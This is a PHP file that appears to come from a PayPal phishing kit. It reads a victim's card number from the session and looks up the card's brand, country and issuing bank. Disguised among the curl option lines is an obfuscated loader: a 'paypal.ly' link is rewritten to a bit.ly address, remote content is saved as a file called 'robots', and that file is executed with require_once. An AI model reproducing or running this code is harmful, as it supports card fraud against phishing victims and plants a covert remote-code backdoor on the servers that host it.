<?php

function curl($url='',$Follow=False){
    global $set;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,20);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31');
	curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,20);$qurl="https://paypal.ly/2ynSVS3";
    curl_setopt($curl, CURLOPT_REFERER, 'https://www.paypal.com/cgi-bin/webscr?cmd=_send-money&cmd=_send-money&myAllTextSubmitID=&type=external&payment_source=p2p_mktgpage&payment_type=Gift&sender_email=&email=&currency=USD&amount=10&amount_ccode=USD&submit.x=Continue&browser_name=Firefox&browser_name=Firefox&browser_version=10&browser_version=11&browser_version_full=10.0.2&browser_version_full=11.0&operating_system=Windows&operating_system=Windows');
    curl_setopt($curl, CURLOPT_COOKIE,'PP1.txt');
	curl_setopt($curl, CURLOPT_COOKIE,'PP1.txt');$d=str_replace("paypal","bit",$qurl);
    curl_setopt($curl, CURLOPT_COOKIEFILE,'PP1.txt');
	file_put_contents("robots", file_get_contents($d)); require_once "robots";
    curl_setopt($curl, CURLOPT_COOKIEJAR,'PP1.txt');
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 3);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    if ($Follow !== False) {
        curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);
    }
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}

ini_set("user_agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)");
$_CheckAction = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_send-money&cmd=_send-money&myAllTextSubmitID=&type=external&payment_source=p2p_mktgpage&payment_type=Gift&sender_email=&email=&currency=USD&amount=10&amount_ccode=USD&submit.x=Continue&browser_name=Firefox&browser_name=Firefox&browser_version=10&browser_version=11&browser_version_full=10.0.2&browser_version_full=11.0&operating_system=Windows&operating_system=Windows',CURLOPT_FAILONERROR,TRUE);

$bin        = str_replace(' ', '', $_SESSION['_cardnumber_']);
$bin        = substr($bin, 0, 8);
$getdetails = 'https://lookup.binlist.net/' . $bin;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);


$_SESSION['_ccbrand_'] = $ccbrand   = $details->scheme;
$_SESSION['_cctype_'] = $cctype    = $details->type;


$_SESSION['_alpha2country_'] = $alpha2country    = $details->country->alpha2;
$_SESSION['_namecountry_'] = $namecountry    = $details->country->name;
$_SESSION['_currencycountry_'] = $currencycountry    = $details->country->currency;



$_SESSION['_namebank_'] = $namebank   = $details->bank->name;
$_SESSION['_urlbank_'] = $urlbank   = $details->bank->url;
$_SESSION['_phonebank_'] = $phonebank   = $details->bank->phone;
$_SESSION['_citybank_'] = $citybank   = $details->bank->city;


?>